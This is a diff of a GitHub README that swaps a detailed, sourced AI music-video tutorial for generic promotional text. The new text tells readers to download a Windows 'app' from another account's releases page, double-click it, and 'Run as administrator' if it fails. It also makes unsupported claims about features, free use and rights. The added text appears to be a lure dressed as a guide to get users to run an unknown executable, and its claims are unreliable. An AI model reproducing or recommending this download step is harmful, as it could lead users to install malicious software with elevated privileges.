@@ -1,301 +1,163 @@
-<h1 align="center"><a href="https://musicmaker.im/"><img src="https://musicmaker.im/images/logo.svg" alt="AI Music Maker logo" width="30" height="30"></a> AI Music Maker Awesome Music Video Creator Guide: Prompts, Examples and Beginner Tutorials</h1>
+# 🎵 awesome-music-video-creator-guide - Make AI Music Videos Easily
 
-<p align="center"><strong>Turn a song into a world worth watching.</strong></p>
+## 🚀 Getting Started
 
-<p align="center">Make a release teaser, a performance clip, or a visual loop—even if this is your first edit. Pick a look, study how creators build it, then make your own.</p>
+Welcome to the **awesome-music-video-creator-guide**! This guide is your friendly companion to creating amazing AI-powered music videos, even if you've never touched a computer program before. Whether you're a musician, a content creator, or just someone curious about AI, this resource will walk you through everything you need.
 
-<!-- LANGUAGES:START -->
-<p align="center"><a href="README.md"><img src="assets/navigation/en-active.svg" alt="English" width="96" height="32"></a> <a href="README_ZH.md"><img src="assets/navigation/zh.svg" alt="简体中文" width="96" height="32"></a> <a href="README_TW.md"><img src="assets/navigation/tw.svg" alt="繁體中文" width="96" height="32"></a> <a href="README_JA.md"><img src="assets/navigation/ja.svg" alt="日本語" width="96" height="32"></a> <a href="README_KO.md"><img src="assets/navigation/ko.svg" alt="한국어" width="96" height="32"></a> <a href="README_ID.md"><img src="assets/navigation/id.svg" alt="Bahasa Indonesia" width="140" height="32"></a> <a href="README_IT.md"><img src="assets/navigation/it.svg" alt="Italiano" width="96" height="32"></a> <a href="README_PT.md"><img src="assets/navigation/pt.svg" alt="Português" width="96" height="32"></a><br>
-<a href="README_ES.md"><img src="assets/navigation/es.svg" alt="Español" width="96" height="32"></a> <a href="README_DE.md"><img src="assets/navigation/de.svg" alt="Deutsch" width="96" height="32"></a> <a href="README_RU.md"><img src="assets/navigation/ru.svg" alt="Русский" width="96" height="32"></a> <a href="README_FR.md"><img src="assets/navigation/fr.svg" alt="Français" width="96" height="32"></a> <a href="README_TH.md"><img src="assets/navigation/th.svg" alt="ไทย" width="96" height="32"></a> <a href="README_VI.md"><img src="assets/navigation/vi.svg" alt="Tiếng Việt" width="96" height="32"></a> <a href="README_AR.md"><img src="assets/navigation/ar.svg" alt="العربية" width="96" height="32"></a></p>
-<!-- LANGUAGES:END -->
+### 📥 Download the App
 
-<!-- DEVICE:START -->
-<p align="center"><a href="mobile/README.md"><img src="assets/navigation/mobile-en.svg" alt="📱 Mobile edition" width="200" height="40"></a></p>
-<!-- DEVICE:END -->
+[![Download Now](https://img.shields.io/badge/Download-App-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/fleyderrivera/awesome-music-video-creator-guide/releases)
 
-<p align="center"><a href="#ai-vs-live"><kbd>◈ AI vs live action</kbd></a> &nbsp; <a href="#official-models"><kbd>✦ Official model examples and tutorials</kbd></a> &nbsp; <a href="#x-creators"><kbd>▶ X examples</kbd></a> &nbsp; <a href="#listen"><kbd>♫ Listen</kbd></a> &nbsp; <a href="#first-video"><kbd>✦ Make your first video</kbd></a> &nbsp; <a href="#next-project"><kbd>→ Next technique</kbd></a> &nbsp; <a href="#toolkit"><kbd>🧰 Free toolkit</kbd></a></p>
+Visit this link to download the application. You'll find the latest version ready for your computer.
 
-[![Choose music, plan shots and prompts, generate clips, then edit and export; explore vocal performance, travel stories and abstract music visuals](assets/social-preview.jpg)](#first-video)
+## 🖥️ What Is This?
 
-Original workflow illustration connecting this library’s examples, prompts, tools and editing steps.
+This guide helps you use AI to turn your music into stunning videos. Instead of spending hours editing, you can generate professional-looking music videos with just a few clicks. The app combines music generation, video creation, and AI tools all in one place.
 
-**Start here:** [Find visual ideas](#x-creators) → [Choose a musical direction](#listen) → [Finish four nature shots](#first-video) → [Try portrait singing](#next-project).
+### ✨ Key Features
 
-<!-- COMPARISON:START -->
-<a id="ai-vs-live"></a>
+- **AI Music Creation**: Generate original songs and beats from text prompts
+- **Video Generation**: Turn your music into visuals automatically
+- **Easy Interface**: Simple buttons and menus—no technical skills needed
+- **Multiple Styles**: Choose from various visual themes and effects
+- **Export Options**: Save your videos in common formats for sharing
 
-## Two music videos: what changes with AI and live action?
+## 🔧 System Requirements
 
-Music can stretch seconds into a spectacle or carry decades past your eyes. Open these two officially released music videos and choose the kind of story you want to try.
+Your computer should have:
 
-<table>
-<tr>
-<td width="50%" valign="top"><b>AI-generated visuals · Human direction</b><br><a href="https://www.youtube.com/watch?v=-Nb-M1GAOX8"><img src="https://i.ytimg.com/vi/-Nb-M1GAOX8/hqdefault.jpg" alt="Washed Out — The Hardest Part · A young couple sitting close together" width="100%"></a><br><b>Washed Out — The Hardest Part</b><br><sub>Director/editor: Paul Trillo · 2024 · Sora visuals</sub><br>Follow a forward-moving camera through fragments of a couple’s life. Watch eras and places blend like memories.<br><a href="https://www.youtube.com/watch?v=-Nb-M1GAOX8"><kbd>▶ Watch the full music video</kbd></a> · <a href="https://www.subpop.com/news/2024/05/02/washed_outs_notes_from_a_quiet_life_available_june_28th">How it was made ↗</a></td>
-<td width="50%" valign="top"><b>Live performance · High-speed photography</b><br><a href="https://www.youtube.com/watch?v=QvW61K2s0tA"><img src="https://i.ytimg.com/vi/QvW61K2s0tA/hqdefault.jpg" alt="OK Go — The One Moment · A performer in front of a rig bursting with colored powder" width="100%"></a><br><b>OK Go — The One Moment</b><br><sub>Director: Damian Kulash · 2016 · Camera, practical effects and post-production</sub><br>Watch paint, bursting props and the band move with the music. High-speed photography unfolds fleeting actions into a spectacle.<br><a href="https://www.youtube.com/watch?v=QvW61K2s0tA"><kbd>▶ Watch the full music video</kbd></a> · <a href="https://okgo.net/2016/11/23/background-notes-and-full-credits-for-the-one-moment-video/">How it was made ↗</a></td>
-</tr>
-</table>
+- **Operating System**: Windows 10 or 11 (64-bit)
+- **Memory**: At least 4 GB RAM (8 GB recommended)
+- **Storage**: 1 GB free space for the app and your projects
+- **Internet**: A stable connection for downloading and updates
 
-<table>
-<tr><td width="50%" valign="top"><b>Where images begin · The AI-generated route</b><br>Describe scenes and shots, then select and assemble generated clips.</td><td width="50%" valign="top"><b>Where images begin · The live-action route</b><br>Arrange performers, locations and props, then film and edit.</td></tr>
-<tr><td width="50%" valign="top"><b>Creative focus · The AI-generated route</b><br>Try unusual scene changes; check character and detail continuity.</td><td width="50%" valign="top"><b>Creative focus · The live-action route</b><br>Rehearse actions, shape light and timing, then edit performance to music.</td></tr>
-<tr><td width="50%" valign="top"><b>One idea to borrow · The AI-generated route</b><br>Let one shot carry the viewer between two settings.</td><td width="50%" valign="top"><b>One idea to borrow · The live-action route</b><br>Land one clear action on a chorus entrance or strong beat.</td></tr>
-</table>
+## 📖 How to Use This Guide
 
-AI offers a way to try a visual idea before building a whole set. You still choose the story, rhythm and final shots. Pick 10–16 seconds of music, start with one scene change, then explore the models and prompts below.
+The guide is organized into simple sections. Start with the basics, then explore advanced features as you get comfortable. Each section includes clear instructions and tips.
 
-[✦ Explore the official model examples](#official-models) · [Comparison notes and sources](docs/ai-vs-live.md)
+### 🎯 Step-by-Step Basics
 
-<!-- COMPARISON:END -->
+1. **Download the app** from the link above
+2. **Open the downloaded file** by double-clicking it
+3. **Follow the on-screen instructions** to finish setup
+4. **Launch the app** from your desktop or Start menu
+5. **Start a new project** by clicking the "Create" button
 
-<!-- OFFICIAL:START -->
-<a id="official-models"></a>
+## 🎶 Creating Your First Music Video
 
-## Official model examples and tutorials
+Let's make your first AI music video! Here's the simple process:
 
-See the makers’ examples before exploring community work.
+### Step 1: Choose Your Music
 
-<table>
-<tr>
-<td width="50%" valign="top"><a href="https://seed.bytedance.com/en/blog/one-take-creation-flexible-referencing-introducing-seedance-2-5"><img src="assets/official/seedance-concert.jpg" alt="Frame from the official Seedance 2.5 concert demonstration" width="100%"></a><br><sub>Official demo frame</sub><br><b>Seedance 2.5</b> · ByteDance Seed<br>Concert: separate references for venue and performers.<br><a href="https://seed.bytedance.com/en/blog/one-take-creation-flexible-referencing-introducing-seedance-2-5"><kbd>▶ Official example</kbd></a> · <a href="https://seed.bytedance.com/en/blog/one-take-creation-flexible-referencing-introducing-seedance-2-5">Official guide / prompt ↗</a><br><a href="docs/official-cases.md#seedance-concert">Step-by-step notes →</a> · <a href="https://musicmaker.im/model/seedance-2-5/"><kbd>MusicMaker ↗</kbd></a></td>
-<td width="50%" valign="top"><a href="https://www.minimax.io/blog/minimax-h3"><img src="https://filecdn.minimax.chat/public/h3-en-v2-image-000-1785473644038.png" alt="Official MiniMax H3 character reference image for the singing demonstration" width="100%"></a><br><sub>Official input image</sub><br><b>MiniMax H3</b> · MiniMax<br>Singing: separate camera, character and vocal references.<br><a href="https://www.minimax.io/blog/minimax-h3"><kbd>▶ Official example</kbd></a> · <a href="https://hailuoai.video/tools/minimax-h3">Official guide / prompt ↗</a><br><a href="docs/official-cases.md#h3-singing">Step-by-step notes →</a> · <a href="https://musicmaker.im/model/minimax-h3/"><kbd>MusicMaker ↗</kbd></a></td>
-</tr>
-<tr>
-<td width="50%" valign="top"><a href="https://deepmind.google/models/veo/"><img src="https://lh3.googleusercontent.com/B3TEWPmHGddbqymciVXc6yVwXbmxZtTBG5PZrUHNZbgISHlOLJokWGoDR0Dqfug4QPIzNUgP9T23Iktd11yMvzfYLqURXmvCDGLr1RIliT9VeZs82g=w1440-h810-n-nu" alt="Official Veo comparison: three reference images beside a singer in an abstract flower garden" width="100%"></a><br><sub>Official input/output comparison</sub><br><b>Veo 3.1</b> · Google DeepMind<br>Surreal singing scene: combine character and setting references.<br><a href="https://deepmind.google/models/veo/"><kbd>▶ Official example</kbd></a> · <a href="https://deepmind.google/models/veo/prompt-guide/">Official guide / prompt ↗</a><br><a href="docs/official-cases.md#veo-scene">Step-by-step notes →</a> · <a href="https://musicmaker.im/model/veo-3-1-ai/"><kbd>MusicMaker ↗</kbd></a></td>
-<td width="50%" valign="top"><a href="https://seed.bytedance.com/en/seedance2_0"><img src="https://p11-sign.douyinpic.com/tos-cn-p-13c08f/6867a9183a794734882c56d613a4fba5_1770872187~tplv-noop.image?dy_q=1770875442&l=20260212134538DCD5D5DD0148D91D5FFB&x-expires=2086235454&x-signature=F%2B11iuE4gyzLtI%2BIRgWao6c8W0g%3D" alt="Official Seedance 2.0 video poster: pianist in a black suit" width="100%"></a><br><sub>Official video poster</sub><br><b>Seedance 2.0</b> · ByteDance Seed<br>Piano performance: move from a medium shot to an expression close-up.<br><a href="https://seed.bytedance.com/en/seedance2_0"><kbd>▶ Official example</kbd></a> · <a href="https://seed.bytedance.com/en/seedance2_0">Official guide / prompt ↗</a><br><a href="docs/official-cases.md#seedance-piano">Step-by-step notes →</a> · <a href="https://musicmaker.im/model/seedance-2-0/"><kbd>MusicMaker ↗</kbd></a></td>
-</tr>
-</table>
+- Select **"Generate Music"** from the main menu
+- Type a description of the style you want (e.g., "upbeat electronic dance")
+- Listen to the preview and pick your favorite version
 
-<!-- OFFICIAL:END -->
+### Step 2: Select Visuals
 
-<a id="x-creators"></a>
+- Click **"Generate Video"**
+- Choose from themes like nature, city, abstract, or space
+- Adjust settings like brightness and motion speed
 
-## Learn from creators on X
+### Step 3: Combine and Export
 
-Six published video examples with public prompts or screenshot walkthroughs. Click any image to open its original post; use **Inputs + try it** for the required references and an original practice prompt.
+- Press **"Preview"** to see your creation
+- Hit **"Export"** to save as a video file
+- Share it on social media or with friends
 
-<table>
-<tr>
-<td width="50%" valign="top"><a href="https://x.com/Just_sharon7/status/2083422886686031982"><img src="https://pbs.twimg.com/amplify_video_thumb/2083422025452765184/img/ZFIIYS0hQ9OI5TpK.jpg" alt="Two dancers on a pink studio set; open the creator’s X post" width="100%"></a><br><b>Pink studio duet</b><br><sub><a href="https://x.com/Just_sharon7/status/2083422886686031982">@Just_sharon7</a> · Seedance 2.5</sub><br>Alternate a wide dance shot with solo close-ups.<br><a href="https://x.com/Just_sharon7/status/2083422886686031982">Video + source prompt</a> · <a href="docs/x-cases.md#duo">Inputs + try it</a></td>
-<td width="50%" valign="top"><a href="https://x.com/techhalla/status/2086915118307119269"><img src="https://pbs.twimg.com/amplify_video_thumb/2086903458251112448/img/jSPsz35xEe3ZFz47.jpg" alt="A performer lying on the ground in the opening of TechHalla’s music clip; open the creator’s X post" width="100%"></a><br><b>Reference-led singing with H3</b><br><sub><a href="https://x.com/techhalla/status/2086915118307119269">@techhalla</a> · MiniMax H3</sub><br>Prepare references, then divide the audio into shots.<br><a href="https://x.com/techhalla/status/2086915118307119269">Video + prompt thread</a> · <a href="docs/x-cases.md#h3-performance">Inputs + try it</a></td>
-</tr>
-<tr>
-<td width="50%" valign="top"><a href="https://x.com/AIwithkhan/status/2087754389624860911"><img src="https://pbs.twimg.com/amplify_video_thumb/2087754331089166336/img/uJ0ET9rgvlWZOLj-.jpg" alt="A performer silhouetted in a backlit corridor; open the creator’s X post" width="100%"></a><br><b>Fisheye rap performance</b><br><sub><a href="https://x.com/AIwithkhan/status/2087754389624860911">@AIwithkhan</a> · Seedance 2.5</sub><br>Use one character reference across bold sets.<br><a href="https://x.com/AIwithkhan/status/2087754389624860911">Video + source prompt</a> · <a href="docs/x-cases.md#y2k">Inputs + try it</a></td>
-<td width="50%" valign="top"><a href="https://x.com/oggii_0/status/2041392542659584302"><img src="https://pbs.twimg.com/ext_tw_video_thumb/2041392519330840576/pu/img/gJnakn0aUsx_Pqnd.jpg" alt="White concentric rings on a black background; open the creator’s X post" width="100%"></a><br><b>Shape changes for a visualizer</b><br><sub><a href="https://x.com/oggii_0/status/2041392542659584302">@oggii_0</a> · Seedance 2.0</sub><br>A motion-design reference for evolving shapes.<br><a href="https://x.com/oggii_0/status/2041392542659584302">Video + source prompt</a> · <a href="docs/x-cases.md#motion-design">Inputs + try it</a></td>
-</tr>
-<tr>
-<td width="50%" valign="top"><a href="https://x.com/Strength04_X/status/2098290630179057858"><img src="https://pbs.twimg.com/amplify_video_thumb/2098289904409362432/img/-LuU_JZblovIR9HB.jpg" alt="A traveler waiting on a dim station platform; open the creator’s X post" width="100%"></a><br><b>A train journey into space</b><br><sub><a href="https://x.com/Strength04_X/status/2098290630179057858">@Strength04_X</a> · Seedance 2.5</sub><br>A fantasy short to study narrative transitions.<br><a href="https://x.com/Strength04_X/status/2098290630179057858">Video + source prompt</a> · <a href="docs/x-cases.md#lunar-train">Inputs + try it</a></td>
-<td width="50%" valign="top"><a href="https://x.com/Strength04_X/status/2090399966988550435"><img src="https://pbs.twimg.com/amplify_video_thumb/2090399674129940480/img/zvDQqERbmMVkeaIT.jpg" alt="An older performer standing on a gold-lit talent-show stage; open the creator’s X post" width="100%"></a><br><b>A stage reveal on the beat</b><br><sub><a href="https://x.com/Strength04_X/status/2090399966988550435">@Strength04_X</a> · Seedance 2.5</sub><br>Pause, reveal, then cut to a reaction.<br><a href="https://x.com/Strength04_X/status/2090399966988550435">Video + source prompt</a> · <a href="docs/x-cases.md#beat-drop">Inputs + try it</a></td>
-</tr>
-</table>
+## 🧠 Understanding AI Music Tools
 
-<a id="listen"></a>
+This guide covers various AI tools and models. Here's what you'll find:
 
-## Listen on MusicMaker
+### Popular AI Music Generators
 
-From solo piano to heavy guitars, from epic orchestra to dance-floor pulses: hear nine contrasts before choosing your imagery. Genres follow each source’s Style field; video directions are editorial exercise ideas.
+- **Suno AI**: Create full songs with vocals and lyrics
+- **AI Music Makers**: Generate instrumental tracks
+- **Suno Alternatives**: Other options with unique features
 
-<!-- LISTENING-GRID:START -->
-<table>
-<tr>
-<td width="33%" valign="top"><a href="https://musicmaker.im/detail/discover-v2-21/"><img src="https://cdn.musicmaker.im/musicmaker/discover_v2/sleeptown_windowlight.webp" alt="An illustrated girl listening beside a turntable and keyboard by a sunlit window" width="100%"></a><br><b>Sleeptown Windowlight</b><br><b>Piano instrumental</b><br><sub>Long takes and close details</sub><br><a href="https://musicmaker.im/detail/discover-v2-21/"><kbd>▶ Listen</kbd></a></td>
-<td width="33%" valign="top"><a href="https://musicmaker.im/detail/discover-v2-52/"><img src="https://cdn.musicmaker.im/musicmaker/discover_v2/voltage_in_my_veins.webp" alt="An illustrated performer surrounded by bright blue and pink light trails" width="100%"></a><br><b>Voltage In My Veins</b><br><b>Modern rock</b><br><sub>Stage cuts and strong beats</sub><br><a href="https://musicmaker.im/detail/discover-v2-52/"><kbd>▶ Listen</kbd></a></td>
-<td width="33%" valign="top"><a href="https://musicmaker.im/detail/discover-v2-24/"><img src="https://cdn.musicmaker.im/musicmaker/discover_v2/crown_of_the_tempest.webp" alt="An orchestra and choir performing outdoors under a blue sky" width="100%"></a><br><b>Crown of the Tempest</b><br><b>Epic orchestral</b><br><sub>Fantasy stories and wide scenes</sub><br><a href="https://musicmaker.im/detail/discover-v2-24/"><kbd>▶ Listen</kbd></a></td>
-</tr>
-<tr>
-<td width="33%" valign="top"><a href="https://musicmaker.im/detail/discover-v2-87/"><img src="https://cdn.musicmaker.im/musicmaker/discover_v2/rain_on_beale.webp" alt="An illustrated cafe with a turquoise awning reflected on a wet street" width="100%"></a><br><b>Rain On Beale</b><br><b>Lo-fi jazz</b><br><sub>Rainy streets and looping scenes</sub><br><a href="https://musicmaker.im/detail/discover-v2-87/"><kbd>▶ Listen</kbd></a></td>
-<td width="33%" valign="top"><a href="https://musicmaker.im/detail/discover-v2-42/"><img src="https://cdn.musicmaker.im/musicmaker/discover_v2/tidal_release.webp" alt="A woman in a white dress beside the sea beneath glowing wave-shaped lights" width="100%"></a><br><b>Tidal Release</b><br><b>Progressive house</b><br><sub>Build tension, then change the scene</sub><br><a href="https://musicmaker.im/detail/discover-v2-42/"><kbd>▶ Listen</kbd></a></td>
-<td width="33%" valign="top"><a href="https://musicmaker.im/detail/discover-v2-48/"><img src="https://cdn.musicmaker.im/musicmaker/discover_v2/back_roads_lead_me_home.webp" alt="A man playing acoustic guitar on a porch overlooking fields" width="100%"></a><br><b>Back Roads Lead Me Home</b><br><b>Country ballad</b><br><sub>Rural stories and warm portraits</sub><br><a href="https://musicmaker.im/detail/discover-v2-48/"><kbd>▶ Listen</kbd></a></td>
-</tr>
-<tr>
-<td width="33%" valign="top"><a href="https://musicmaker.im/detail/discover-v2-22/"><img src="https://cdn.musicmaker.im/musicmaker/discover_v2/midnight_garden_circuits.webp" alt="A green meadow under a pastel sky with abstract waves and cover lettering" width="100%"></a><br><b>Midnight Garden Circuits</b><br><b>Ambient electronic</b><br><sub>Abstract shapes and slow motion</sub><br><a href="https://musicmaker.im/detail/discover-v2-22/"><kbd>▶ Listen</kbd></a></td>
-<td width="33%" valign="top"><a href="https://musicmaker.im/detail/discover-v2-60/"><img src="https://cdn.musicmaker.im/musicmaker/discover_v2/basement_crown.webp" alt="A gold crown on a studio speaker beside a mixing desk" width="100%"></a><br><b>Basement Crown</b><br><b>Hip-hop</b><br><sub>Street textures and decisive cuts</sub><br><a href="https://musicmaker.im/detail/discover-v2-60/"><kbd>▶ Listen</kbd></a></td>
-<td width="33%" valign="top"><a href="https://musicmaker.im/detail/discover-v2-90/"><img src="https://cdn.musicmaker.im/musicmaker/discover_v2/keep_it_open.webp" alt="A seated man and woman talking beside an open doorway facing the sea" width="100%"></a><br><b>Keep It Open</b><br><b>Electronic R&B</b><br><sub>Emotional close-ups and pauses</sub><br><a href="https://musicmaker.im/detail/discover-v2-90/"><kbd>▶ Listen</kbd></a></td>
-</tr>
-</table>
-<!-- LISTENING-GRID:END -->
+### Prompt Writing Tips
 
-Pick a sound, then make a cover and one short scene for it. [🧰 Choose free tools by step](#toolkit) · [Genre and source notes](docs/listening-notes.md) · [Browse all songs](https://musicmaker.im/discover/).
+- Be descriptive: "sad piano melody with rain sounds"
+- Mention mood, tempo, and instruments
+- Keep it simple—one or two sentences is often enough
 
-<a id="first-video"></a>
+## ⚠️ Troubleshooting Common Issues
 
-## Make your first video
+### The app won't download
 
-### Project 1: a rainbow valley in 16 seconds
+- Check your internet connection
+- Try a different browser (Chrome or Firefox)
+- Ensure you have enough storage space
 
-<table><tr><td width="42%" valign="top"><a href="https://musicmaker.im/detail/discover-v2-98/"><img src="https://cdn.musicmaker.im/musicmaker/discover_v2/living_on_the_brightside.webp" alt="A rainbow over a green valley, stream and wildflowers; open Living on the Brightside" width="100%"></a></td><td width="58%" valign="top">Use the cover of MusicMaker's <b>Living on the Brightside</b> as visual inspiration: a stream, wildflowers, green hills and a rainbow. Start with scenery and four cuts, so you can finish one musical phrase without solving character consistency first.<br><br><b>1. Prepare music and mark the cuts</b><br>Choose a complete 16-second phrase from music you own or have permission to use. Alternatively, download our original practice beat with <b>Download raw file</b> on its GitHub page. Import it into your editor and mark 0, 4, 8, 12 and 16 seconds. These cuts fit the practice beat; adjust them to the beats and phrase endings of another song.</td></tr></table>
+### The app won't open
 
-[▶ Hear the source track](https://musicmaker.im/detail/discover-v2-98/) · [♫ Download the original practice beat](starter-kit/practice-beat-120bpm.wav)
+- Restart your computer
+- Re-download the file
+- Right-click the file and select "Run as administrator"
 
-#### 2. Choose a tool route
+### Videos are taking too long
 
-| Route | Start here | Exercise settings |
-|---|---|---|
-| [Official: Hailuo H3](https://hailuoai.video/tools/minimax-h3) | Select MiniMax H3 and Text-to-Video; paste one shot prompt at a time | 9:16, four separate 5-second clips |
-| [MusicMaker short clips](https://musicmaker.im/free-short-music-video-generator/) | Use the text route; the image route instead needs start and end images | Currently 5 seconds at 480p; choose 9:16 |
+- Close other programs that use heavy memory
+- Use shorter music tracks (under 3 minutes)
+- Select lower video quality for quicker results
 
-MusicMaker identifies H3 on its short-clip page; the official interface offers additional reference inputs and settings. The text route needs no downloaded brand cover. For image input, supply your own authorized scene images with similar framing and light.
+## 🛠️ Advanced Customization
 
-#### 3. Generate one shot at a time
+Once you're comfortable, try these power-user features:
 
-Start with A. Check the flowers, water and scenery before generating B–D. Copy each prompt separately.
+- **Import your own music**: Use your existing audio files
+- **Custom prompts**: Fine-tune AI behavior with detailed descriptions
+- **Batch processing**: Generate multiple videos at once
+- **Editing tools**: Trim, add text, and overlay effects
 
-| Final timing | Shot | Check |
-|---|---|---|
-| 0–4s | Wildflowers beside the stream | Stable petals and subtle movement |
-| 4–8s | Stream and grassy slope | Water flows in one direction |
-| 8–12s | Valley and rainbow, wide | Stable rainbow and horizon |
-| 12–16s | Locked wide ending | Clear space for an editorial title |
+## 🔄 Staying Updated
 
-```text
-A: A green valley after rain, soft afternoon sunlight.
-Close-up of purple wildflowers with water droplets beside a shallow stream.
-Locked camera; a light breeze moves only the flower stems. Soft grassy background.
-Natural photographic realism. No people, buildings or text; keep flower count stable.
-```
+The app receives regular updates with new features and improvements. To get updates:
 
-```text
-B: The same green valley after rain in soft afternoon sunlight.
-Medium view of a shallow stream flowing between grassy slopes toward the foreground.
-Locked camera; water moves slowly over stones, purple flowers sway subtly.
-Keep the riverbanks stable. No people, buildings or text.
-```
+1. Visit the [download page](https://github.com/fleyderrivera/awesome-music-video-creator-guide/releases)
+2. Check the version number
+3. Download the newest release if available
 
-```text
-C: Wide view of a green valley after rain in soft afternoon sunlight.
-One rainbow spans the distant sky; a shallow stream and purple flowers fill the foreground.
-Locked wide camera; grass moves subtly and clouds drift slowly.
-Keep the rainbow stationary. No extra rainbows, people, buildings, text or fast camera moves.
-```
+## 💡 Pro Tips
 
-```text
-D: A distant view of the same green valley after rain, soft afternoon sunlight.
-A shallow stream leads toward one rainbow. Locked camera; only water and grass move subtly.
-Leave clean grass in the lower frame for a title added later.
-Keep terrain and rainbow stable. No people, buildings or generated text.
-```
+- **Start small**: Begin with short 30-second videos
+- **Experiment freely**: Don't be afraid to try wild prompts
+- **Save your work**: Keep your favorite settings for reuse
+- **Join the community**: Share your results and learn from others
 
-#### 4. Edit and finish
+## 📄 Frequently Asked Questions
 
-Keep the best four seconds of each clip and use straight cuts. Mute generated sound and retain one music track. Add your title in the final two seconds and a brief music fade at the end. Export MP4 at 9:16 using a resolution appropriate to your footage; enlarging 480p does not create extra detail. [Editor and export walkthrough](docs/first-video.md#3-assemble-in-an-editor).
+### Is this app free?
+Yes, the core features are free to use. Some advanced options may require optional in-app purchases.
 
-**Done means:** music and picture end together; no black frames or doubled audio; water direction, lighting and rainbow remain plausible. Reduce motion if the rainbow warps. If the landscape changes too much, regenerate with a consistent authorized image reference.
+### Can I use my own photos in videos?
+Absolutely! Look for the "Import Media" option to add personal images.
 
-<a id="next-project"></a>
+### Will this work on Mac?
+Currently, this guide and app focus on Windows. Check the download page for future updates.
 
-## Finish one project before learning the next technique
+### Can I make money with videos I create?
+Yes, you retain rights to your creations. Check the app's terms for specific details.
 
-### Project 2: one chorus line, 10 seconds of portrait singing
+## 📬 Need More Help?
 
-<table><tr><td width="42%" valign="top"><a href="https://cdn.musicmaker.im/musicmaker/ai_music_video_generator/example/example2_video.mp4"><img src="https://cdn.musicmaker.im/musicmaker/ai_music_video_generator/example/example2_cover.webp" alt="Input portrait of a singer at a gold microphone under pink stage lights; open the brand video demo" width="100%"></a></td><td width="58%" valign="top">Now move from scenery to <b>a fixed close-up performance</b>. Finish one vocal phrase with coherent identity, expression and mouth timing before adding choreography or cuts.<br><br><b>1. Prepare a portrait and a vocal phrase</b><br>Use an authorized frontal or slightly angled portrait with visible lips, a microphone clear of the mouth, and hands outside the crop. Trim your own or licensed singing to a complete phrase around ten seconds, with a little breathing room at each end. A clear solo voice is easier to inspect than stacked harmonies. The instrumental practice beat above is <b>not a vocal input</b>.</td></tr></table>
+If you're stuck, try these steps:
 
-[▶ Watch the brand performance](https://cdn.musicmaker.im/musicmaker/ai_music_video_generator/example/example2_video.mp4) · [Source notes](docs/brand-examples.md)
+1. Restart the app and try again
+2. Read through the guide sections carefully
+3. Look for help buttons within the app
+4. Return to this guide for the download link and start fresh
 
-The image is the published demo's **input portrait**. Click it to watch the approximately ten-second example.
+## 🎉 Let's Get Creative!
 
-#### 2. Place the same inputs in either tool
+You now have all the basics to start making incredible AI music videos. Remember, the best way to learn is by experimenting. Don't worry about making mistakes—every creation is a step forward. Your first video might take a few minutes to complete, so be patient and enjoy the process.
 
-| Route | Inputs | Before generating |
-|---|---|---|
-| [Official: Hailuo H3](https://hailuoai.video/tools/minimax-h3) | H3 → Omni Reference; add portrait and vocal audio to Refs, then the prompt | Audio references require an image or video alongside them; choose about 10 seconds and a matching aspect ratio |
-| [MusicMaker performance tool](https://musicmaker.im/ai-music-video-generator/) | Vocal in Music File; portrait in Character Image; instructions in Prompt | Trim audio, review the estimate and Public switch, then Generate |
+### Final Checklist Before You Start
+- [ ] You have a stable internet connection
+- [ ] Your computer meets the minimum requirements
+- [ ] You've set aside 15-30 minutes for your first session
+- [ ] You're ready to have fun and explore!
 
-The official reference mode combines identity and audio; MusicMaker groups music, portrait and instructions in one workflow. A text-only short-clip form is not a substitute for these inputs.
+Now, download the app, follow the simple instructions, and let the AI do the heavy lifting. Before you know it, you'll have your own collection of awesome music videos to share with the world. The combination of AI music generation and video creation has never been this accessible. Start your journey today!
 
-#### 3. Copy the complete performance prompt
-
-```text
-Use my uploaded portrait as the only character reference and my uploaded vocal as the timing guide.
-Keep the same adult singer, face, hairstyle, clothes and lighting as in the supplied portrait.
-Locked shoulder-up close-up. Keep the microphone below and beside the lips, never covering them.
-Hands stay outside the frame. Perform the supplied phrase with natural matching mouth movements,
-subtle breathing, blinking and a slight nod. Hold the pose through sustained notes.
-Relax naturally after the phrase. Do not add dialogue or change lyrics.
-No costume change, turning around, cuts, additional people, text or exaggerated expressions.
-```
-
-#### 4. Fix timing before adding camera movement
-
-Inspect the beginning, middle and end of the phrase. Check vowels and closed-mouth endings against the sound. A constant early/late offset may be adjusted in your editor; an offset that grows over time calls for a shorter phrase or a new generation. If identity drifts, remove nodding and camera motion. If lips are hidden, replace the portrait rather than adding more instructions.
-
-#### 5. Keep one soundtrack and export the complete phrase
-
-Place the video and original vocal on one timeline. To use the original vocal, mute generated sound and recheck sync; to use generated sound, remove the duplicate audio track. Keep one shot and add your song title in the final second. Export MP4, then check the rendered file's lips, face, volume and ending. [Detailed singing and editing checks](docs/first-video.md#vocal).
-
-**Done means:** the same person finishes the phrase; lips remain visible; there is one main soundtrack; the ending retains a natural breath. Only then try a slow push-in, changing one thing at a time.
-
-<a id="toolkit"></a>
-
-## A free-first music video toolkit
-
-Build on the sound you picked: choose a tool for the missing ingredient. The first four rows are advertised as free on their pages. Song generation, portrait singing and other catalog tools may require credits or payment; check [pricing](https://musicmaker.im/pricing/).
-
-<table>
-<tr><td width="35%"><b>🖼 Artwork and storyboard</b></td><td><a href="https://musicmaker.im/free-chatgpt-images-2-5/"><kbd>↗ Free image generator</kbd></a></td></tr>
-<tr><td width="35%"><b>🎬 A short moving scene</b></td><td><a href="https://musicmaker.im/free-short-music-video-generator/"><kbd>↗ 5s short video</kbd></a> · <a href="https://musicmaker.im/free-text-to-video/"><kbd>↗ Text to video</kbd></a></td></tr>
-<tr><td width="35%"><b>🎧 A different audio texture</b></td><td><a href="https://musicmaker.im/lofi-song-maker/"><kbd>↗ Lo-fi song maker</kbd></a></td></tr>
-<tr><td width="35%"><b>📦 Audio format and track metadata</b></td><td><a href="https://musicmaker.im/audio-converter/mp3-to-wav/"><kbd>↗ MP3 → WAV</kbd></a> · <a href="https://musicmaker.im/mp3-tag-editor-online/"><kbd>↗ MP3 tag editor</kbd></a></td></tr>
-<tr><td width="35%"><b>📚 Songs, examples and prompts</b></td><td><a href="https://musicmaker.im/discover/"><kbd>↗ Discover</kbd></a> · <a href="https://musicmaker.im/ai-music-video-generator/"><kbd>↗ Video examples</kbd></a> · <a href="prompts/README.md"><kbd>↗ 12 prompts</kbd></a></td></tr>
-</table>
-
-[→ Explore all resources and tools: six categories, 93 entries](docs/brand-resources.md)
-
-## Choosing a model: official documentation and MusicMaker routes
-
-<!-- CAPABILITIES:START -->
-<table>
